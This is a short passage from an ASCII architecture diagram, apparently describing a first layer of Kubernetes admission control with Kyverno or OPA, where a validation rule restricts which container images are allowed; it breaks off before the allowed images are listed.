  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  LAYER 1: Admission Control (Kyverno/OPA)                        │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │ validate: image must match one of:                       │   │
